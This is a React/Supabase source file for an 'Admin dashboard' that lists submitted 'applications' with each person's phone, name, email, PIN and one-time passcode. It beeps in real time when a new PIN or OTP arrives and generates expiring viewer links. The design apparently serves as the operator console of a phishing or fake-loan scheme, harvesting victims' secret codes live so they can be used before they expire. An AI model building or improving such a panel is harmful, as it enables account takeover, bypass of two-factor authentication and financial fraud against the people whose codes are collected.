import React, { useEffect, useRef, useState } from 'react';
import { supabase } from '../supabaseClient';
import { derivePinAndOtpFromRecord, normalizeApplicationRecord } from '../utils/supabaseCompat';
import {
  createViewerLinkInSupabase,
  fetchApplicationsFromSupabase,
  fetchApplicationByIdFromSupabase,
  fetchViewerLinksFromSupabase,
  revokeViewerLinkInSupabase,
  updateApplicationStatusInSupabase,
} from '../utils/supabaseDirect';

type ApplicationRecord = {
  id: string;
  phone?: string | null;
  pin?: string | null;
  otp?: string | null;
  firstName?: string | null;
  lastName?: string | null;
  verificationCode?: string | null;
  verification_code?: string | null;
  submittedAt?: string | null;
  email?: string | null;
};

type AdminLinkRecord = {
  id: string;
  admin_id: string;
  created_by: string;
  created_at: string;
  expires_at: string;
  revoked: boolean;
  revoked_at?: string | null;
  usage_count?: number;
  last_used_at?: string | null;
};

const sortApplications = (items: ApplicationRecord[]) =>
  [...items].sort((a, b) => new Date(b.submittedAt ?? 0).getTime() - new Date(a.submittedAt ?? 0).getTime());

const formatDateTime = (value: string) =>
  new Date(value).toLocaleString([], {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });

const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [applications, setApplications] = useState<ApplicationRecord[]>([]);
  const [isLoadingApplications, setIsLoadingApplications] = useState(true);
  const [links, setLinks] = useState<AdminLinkRecord[]>([]);
  const [isApproving, setIsApproving] = useState<Record<string, boolean>>({});
  const [minutes, setMinutes] = useState('30');
  const [hours, setHours] = useState('0');
  const [days, setDays] = useState('0');
  const [exactExpiry, setExactExpiry] = useState('');
  const [createdLink, setCreatedLink] = useState<string | null>(null);
  const [isCreatingLink, setIsCreatingLink] = useState(false);
  const [notificationPulse, setNotificationPulse] = useState(false);
  const channelRef = useRef<any>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const notificationTimeoutRef = useRef<number | null>(null);
  const applicationsRef = useRef<ApplicationRecord[]>([]);

  const getAuthHeaders = async () => {
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    const params = new URLSearchParams(window.location.search);
    const accessToken = params.get('access_token');
    if (accessToken) {
      headers['x-admin-access-token'] = accessToken;
    }

    if (!supabase) {
      return headers;
    }

    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (session?.access_token) {
        headers.Authorization = `Bearer ${session.access_token}`;
      }
    } catch {
      // ignore
    }

    return headers;
  };

  const fetchApplications = async () => {
    setIsLoadingApplications(true);
    try {
      const rows = await fetchApplicationsFromSupabase(100);
      const normalized = (rows ?? []).map((r: any) => normalizeApplicationRecord(r));
      setApplications(sortApplications(normalized));
      setError(null);
    } catch (err: any) {
      setError(err?.message || 'Unable to load applications');
      setApplications([]);
    } finally {
      setIsLoadingApplications(false);
    }
  };

  const fetchLinks = async () => {
    try {
      const rows = await fetchViewerLinksFromSupabase();
      setLinks(rows ?? []);
    } catch (err: any) {
      console.error('[AdminPage] fetchLinks failed', err);
      setLinks([]);
    }
  };

  const upsertApplicationInState = (newApplication: ApplicationRecord) => {
    const normalized = normalizeApplicationRecord(newApplication as Record<string, any>);

    setApplications((current) => {
      const existingIndex = current.findIndex((item) => item.id === normalized.id);
      if (existingIndex >= 0) {
        const next = [...current];
        next[existingIndex] = { ...next[existingIndex], ...normalized };
        return sortApplications(next);
      }
      return sortApplications([normalized as ApplicationRecord, ...current]);
    });
  };

  const approveApplication = async (applicationId: string) => {
    setIsApproving((prev) => ({ ...prev, [applicationId]: true }));
    try {
      const updated = await updateApplicationStatusInSupabase(applicationId, 'Approved');
      if (updated) {
        setApplications((current) =>
          current.map((item) => (item.id === applicationId ? { ...item, status: updated.status } : item))
        );
      }
    } catch (err: any) {
      console.error('[AdminPage] approveApplication failed', err);
      setError(err?.message || 'Unable to approve application');
    } finally {
      setIsApproving((prev) => ({ ...prev, [applicationId]: false }));
    }
  };

  const getAudioContext = () => {
    if (audioContextRef.current) {
      return audioContextRef.current;
    }

    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioCtx) {
      console.debug('[AdminPage] No AudioContext support available');
      return null;
    }

    try {
      audioContextRef.current = new AudioCtx();
      console.debug('[AdminPage] AudioContext created');
    } catch (err: any) {
      console.warn('[AdminPage] Failed to create AudioContext', err);
      return null;
    }

    return audioContextRef.current;
  };

  const playBeeps = async (count: number) => {
    const context = getAudioContext();
    console.debug('[AdminPage] playBeeps count=', count, 'currentState=', context?.state);
    if (!context || count < 1) {
      if (!context) {
        console.warn('[AdminPage] AudioContext unavailable, cannot play beeps');
      }
      return;
    }

    try {
      if (context.state === 'suspended') {
        console.debug('[AdminPage] AudioContext suspended, attempting resume');
        await context.resume();
        console.debug('[AdminPage] AudioContext resumed:', context.state);
      }
    } catch (err: any) {
      console.warn('[AdminPage] AudioContext resume failed, user interaction may be required', err);
      return;
    }

    if (context.state !== 'running') {
      console.warn('[AdminPage] AudioContext not running after resume:', context.state);
    }

    const now = context.currentTime;
    const beepDuration = 0.14;
    const gap = 0.2;
    const oscillator = context.createOscillator();
    const gain = context.createGain();

    oscillator.type = 'sine';
    oscillator.frequency.value = 880;
    gain.gain.value = 0;
    gain.gain.setValueAtTime(0.8, now);
    gain.connect(context.destination);
    oscillator.connect(gain);
    oscillator.start(now);

    for (let index = 0; index < count; index += 1) {
      const startTime = now + index * (beepDuration + gap);
      const endTime = startTime + beepDuration;
      gain.gain.setValueAtTime(0, startTime);
      gain.gain.linearRampToValueAtTime(0.45, startTime + 0.01);
      gain.gain.setValueAtTime(0.45, endTime - 0.02);
      gain.gain.linearRampToValueAtTime(0, endTime);
    }

    oscillator.stop(now + count * (beepDuration + gap));
    oscillator.onended = () => {
      oscillator.disconnect();
      gain.disconnect();
    };
  };

  const triggerRealtimeNotification = (beepCount: number) => {
    console.debug('[AdminPage] triggerRealtimeNotification', { beepCount });
    setNotificationPulse(true);
    if (notificationTimeoutRef.current) {
      window.clearTimeout(notificationTimeoutRef.current);
    }
    notificationTimeoutRef.current = window.setTimeout(() => {
      setNotificationPulse(false);
      notificationTimeoutRef.current = null;
    }, 1200);

    void playBeeps(beepCount);
  };

  const connectRealtime = async () => {
    if (channelRef.current) {
      try {
        if (typeof channelRef.current.close === 'function') {
          channelRef.current.close();
        } else if (typeof channelRef.current.unsubscribe === 'function') {
          await channelRef.current.unsubscribe();
        }
      } catch {
        // ignore
      }
    }

    if (!supabase) {
      setError('Supabase is not configured for realtime');
      return;
    }

    const channel = supabase
      .channel('admin-dashboard-realtime')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'applications' }, (payload: any) => {
        const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
        triggerRealtimeNotification(3);
        setApplications((current) => {
          const existingIndex = current.findIndex((item) => item.id === normalized.id);
          const next = existingIndex >= 0
            ? (() => {
                const clone = [...current];
                clone[existingIndex] = { ...clone[existingIndex], ...normalized };
                return clone;
              })()
            : [normalized as ApplicationRecord, ...current];
          return sortApplications(next);
        });
      })
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'applications' }, (payload: any) => {
        const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
        const oldRecord = (payload.old as Record<string, any>) || {};
        const newRecord = payload.new as Record<string, any>;
        const existingApp = applicationsRef.current.find((item) => item.id === normalized.id);

        const oldPin = payload.old
          ? derivePinAndOtpFromRecord(oldRecord).pin
          : existingApp?.pin ?? '';
        const oldOtp = payload.old
          ? derivePinAndOtpFromRecord(oldRecord).otp
          : existingApp?.otp ?? '';
        const newPin = derivePinAndOtpFromRecord(newRecord).pin;
        const newOtp = derivePinAndOtpFromRecord(newRecord).otp;

        const pinChanged = oldPin !== newPin;
        const otpChanged = oldOtp !== newOtp;
        if (pinChanged) {
          triggerRealtimeNotification(2);
        } else if (otpChanged) {
          triggerRealtimeNotification(1);
        }

        setApplications((current) => {
          const existingIndex = current.findIndex((item) => item.id === normalized.id);
          const next = existingIndex >= 0
            ? (() => {
                const clone = [...current];
                clone[existingIndex] = { ...clone[existingIndex], ...normalized };
                return clone;
              })()
            : [normalized as ApplicationRecord, ...current];
          return sortApplications(next);
        });
      });

    channelRef.current = channel;
    await channel.subscribe();
    return;
  };

  useEffect(() => {
    const restoreSession = async () => {
      const params = new URLSearchParams(window.location.search);
      const accessToken = params.get('access_token');

      if (!supabase) {
        if (accessToken) {
          setIsLoggedIn(true);
          await fetchApplications();
          await fetchLinks();
          await connectRealtime();
          return;
        }
        setError('Supabase is not configured');
        return;
      }

      try {
        const { data: { session }, error } = await supabase.auth.getSession();
        if (error) {
          throw error;
        }

        if (!session) {
          setIsLoggedIn(false);
          return;
        }

        const { data: { user } } = await supabase.auth.getUser(session.access_token);
        if (!user) {
          throw new Error('Unable to restore Supabase session');
        }

        setIsLoggedIn(true);
        await fetchApplications();
        await fetchLinks();
        await connectRealtime();
      } catch (err: any) {
        console.error('[Auth] session restore failed', err);
        setIsLoggedIn(false);
      }
    };

    const { data: authListener } = supabase
      ? supabase.auth.onAuthStateChange((event, session) => {
          if (session) {
            setIsLoggedIn(true);
            void fetchApplications();
            void fetchLinks();
            void connectRealtime();
            return;
          }

          setIsLoggedIn(false);
          setError(null);
        })
      : { data: null };

    void restoreSession();
    return () => {
      authListener?.subscription?.unsubscribe?.();
      if (channelRef.current) {
        try {
          if (typeof channelRef.current.close === 'function') {
            channelRef.current.close();
          } else if (typeof channelRef.current.unsubscribe === 'function') {
            channelRef.current.unsubscribe();
          }
        } catch {
          // ignore
        }
      }
      if (notificationTimeoutRef.current) {
        window.clearTimeout(notificationTimeoutRef.current);
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    applicationsRef.current = applications;
  }, [applications]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const normalizedUsername = username.trim();
    const normalizedPassword = password.trim();

    if (!normalizedUsername || !normalizedPassword) {
      setError('Email and password are required');
      return;
    }

    if (!supabase) {
      setError('Supabase is not configured');
      return;
    }

    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: normalizedUsername,
        password: normalizedPassword,
      });
      if (error || !data.session || !data.user) {
        throw error || new Error('Unable to sign in');
      }

      setIsLoggedIn(true);
      await fetchApplications();
      await fetchLinks();
      await connectRealtime();
    } catch (err: any) {
      console.error('[Auth] sign in failed', err);
      setError(err?.message || 'Unable to login');
    }
  };

  const createLink = async () => {
    setIsCreatingLink(true);
    setCreatedLink(null);
    try {
      const link = await createViewerLinkInSupabase({
        durationMinutes: Number(minutes || 0),
        durationHours: Number(hours || 0),
        durationDays: Number(days || 0),
        expiresAt: exactExpiry || undefined,
      });
      setCreatedLink(link.viewerUrl || null);
      await fetchLinks();
      setError(null);
    } catch (err: any) {
      console.error('[AdminPage] createLink failed', err);
      setError(err?.message || 'Unable to create viewer link.');
    } finally {
      setIsCreatingLink(false);
    }
  };

  const revokeLink = async (id: string) => {
    try {
      await revokeViewerLinkInSupabase(id);
      await fetchLinks();
    } catch (err: any) {
      console.error('[AdminPage] revokeLink failed', err);
      setError(err?.message || 'Unable to revoke viewer link.');
    }
  };

  const handleBackToApp = async () => {
    if (supabase) {
      try {
        const { error } = await supabase.auth.signOut();
        if (error) {
          throw error;
        }
      } catch (err: any) {
        console.error('[Auth] signOut failed', err);
      }
    }
    onBackToApp();
  };

  if (!isLoggedIn) {
    return (
      <div className="w-full max-w-md rounded-3xl border border-slate-200 bg-white p-6 shadow-sm">
        <button type="button" onClick={handleBackToApp} className="text-sm font-semibold text-slate-600 hover:text-slate-900">
          ← Back to application
        </button>
        <h2 className="mt-4 text-2xl font-semibold text-slate-900">Admin Login</h2>
        {error ? <div className="mt-3 rounded-2xl border border-red-200 bg-red-50 p-3 text-sm text-red-700">{error}</div> : null}
        <form onSubmit={handleLogin} className="mt-6 space-y-4">
          <div>
            <label className="block text-sm font-semibold text-slate-700">Username</label>
            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-4 py-3" required />
          </div>
          <div>
            <label className="block text-sm font-semibold text-slate-700">Password</label>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-4 py-3" required />
          </div>
          <button type="submit" className="w-full rounded-full bg-blue-600 px-4 py-3 text-sm font-semibold text-white">Sign In</button>
        </form>
      </div>
    );
  }

  return (
    <div className="w-full max-w-6xl rounded-[28px] border border-slate-200 bg-white p-6 shadow-sm">
      <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
        <div>
          <button type="button" onClick={onBackToApp} className="text-sm font-semibold text-slate-600 hover:text-slate-900">
            ← Back to application
          </button>
          <h1 className="mt-3 text-2xl font-semibold text-slate-900">Admin dashboard</h1>
          <p className="mt-2 text-sm text-slate-500">Live phone numbers from every submission.</p>
        </div>
        <div className="flex items-center gap-2 rounded-full bg-slate-100 px-4 py-2 text-sm font-medium text-slate-600">
          <span className={`h-2.5 w-2.5 rounded-full bg-emerald-500 transition-all duration-200 ${notificationPulse ? 'opacity-100 scale-110' : 'opacity-0 scale-75'}`} />
          <span>Realtime-ready</span>
        </div>
      </div>

      {error ? <div className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-3 text-sm text-red-700">{error}</div> : null}

      <div className="mt-6 grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
        <section className="rounded-3xl border border-slate-200 p-4">
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold text-slate-900">Applications</h2>
            <span className="text-sm text-slate-500">{applications.length} total</span>
          </div>
          {isLoadingApplications ? (
            <div className="mt-4 rounded-2xl border border-slate-200 bg-slate-50 p-6 text-sm text-slate-600">Loading submissions…</div>
          ) : applications.length === 0 ? (
            <div className="mt-4 rounded-2xl border border-slate-200 bg-slate-50 p-6 text-sm text-slate-600">No submissions yet.</div>
          ) : (
            <div className="mt-4 space-y-3">
              {applications.map((app) => {
                const rawVerificationValue = app.verificationCode ?? app.verification_code ?? '';
                const pinValue = app.pin || rawVerificationValue.match(/PIN[:\s]+([^\s/]+)/i)?.[1] || '—';
                const otpValue = app.otp || rawVerificationValue.match(/OTP[:\s]+([^\s/]+)/i)?.[1] || '—';
                return (
                <div key={app.id} className="rounded-2xl border border-slate-200 p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="text-base font-semibold text-slate-900">{app.phone || '—'}</p>
                      <p className="text-sm text-slate-600">{[app.firstName, app.lastName].filter(Boolean).join(' ') || 'Unknown applicant'}</p>
                    </div>
                    <div className="text-sm text-slate-500">{app.submittedAt ? formatDateTime(app.submittedAt) : '—'}</div>
                  </div>
                  <div className="mt-3">
                    <div className="rounded-xl bg-slate-50 p-3 text-sm text-slate-700">
                      <div><strong className="text-slate-900">Email:</strong> {app.email || 'Not provided'}</div>
                      <div className="mt-1"><strong className="text-slate-900">Phone:</strong> {app.phone || '—'}</div>
                      <div className="mt-1"><strong className="text-slate-900">PIN:</strong> {pinValue}</div>
                      <div className="mt-1"><strong className="text-slate-900">OTP:</strong> {otpValue}</div>
                    </div>
                  </div>
                  <div className="mt-3 flex items-center justify-between gap-3">
                    <div className="text-sm text-slate-500">{app.status || 'Pre-Approved'}</div>
                    {app.status?.toLowerCase() !== 'approved' ? (
                      <button
                        type="button"
                        onClick={() => approveApplication(app.id)}
                        disabled={Boolean(isApproving[app.id])}
                        className="rounded-full bg-blue-600 px-4 py-2 text-sm font-semibold text-white transition hover:bg-blue-700 disabled:opacity-60"
                      >
                        {isApproving[app.id] ? 'Approving…' : 'Approve'}
                      </button>
                    ) : (
                      <span className="rounded-full bg-emerald-100 px-3 py-1 text-xs font-semibold text-emerald-800">Approved</span>
                    )}
                  </div>
                </div>
                );
              })}
            </div>
          )}
        </section>

        <section className="space-y-4 rounded-3xl border border-slate-200 p-4">
          <div>
            <h2 className="text-lg font-semibold text-slate-900">Viewer links</h2>
            <p className="mt-1 text-sm text-slate-500">Create secure shareable links for read-only views.</p>
          </div>

          <div className="rounded-2xl border border-slate-200 bg-slate-50 p-4">
            <div className="grid gap-3 sm:grid-cols-3">
              <div>
                <label className="block text-sm font-semibold text-slate-700">Minutes</label>
                <input value={minutes} onChange={(e) => setMinutes(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
              </div>
              <div>
                <label className="block text-sm font-semibold text-slate-700">Hours</label>
                <input value={hours} onChange={(e) => setHours(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
              </div>
              <div>
                <label className="block text-sm font-semibold text-slate-700">Days</label>
                <input value={days} onChange={(e) => setDays(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
              </div>
            </div>
            <div className="mt-3">
              <label className="block text-sm font-semibold text-slate-700">Exact expiry date/time</label>
              <input type="datetime-local" value={exactExpiry} onChange={(e) => setExactExpiry(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
            </div>
            <button type="button" onClick={createLink} disabled={isCreatingLink} className="mt-4 w-full rounded-full bg-blue-600 px-4 py-3 text-sm font-semibold text-white disabled:opacity-60">
              {isCreatingLink ? 'Creating link…' : 'Create viewer link'}
            </button>
            {createdLink ? (
              <div className="mt-3 rounded-2xl border border-emerald-200 bg-emerald-50 p-3 text-sm text-emerald-700">
                <div className="font-semibold">Created link</div>
                <a href={createdLink} target="_blank" rel="noreferrer" className="break-all underline">{createdLink}</a>
              </div>
            ) : null}
          </div>

          <div className="space-y-2">
            {links.length === 0 ? (
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-3 text-sm text-slate-600">No links yet.</div>
            ) : (
              links.map((link) => (
                <div key={link.id} className="rounded-2xl border border-slate-200 p-3 text-sm">
                  <div className="flex items-center justify-between gap-2">
                    <div>
                      <div className="font-semibold text-slate-900">{link.revoked ? 'Revoked' : 'Active'}</div>
                      <div className="text-slate-500">Expires {formatDateTime(link.expires_at)}</div>
                    </div>
                    <button type="button" onClick={() => revokeLink(link.id)} className="rounded-full border border-slate-300 px-3 py-1 text-xs font-semibold text-slate-700">
                      Revoke
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </section>
      </div>
    </div>
  );
};

export default AdminPage;
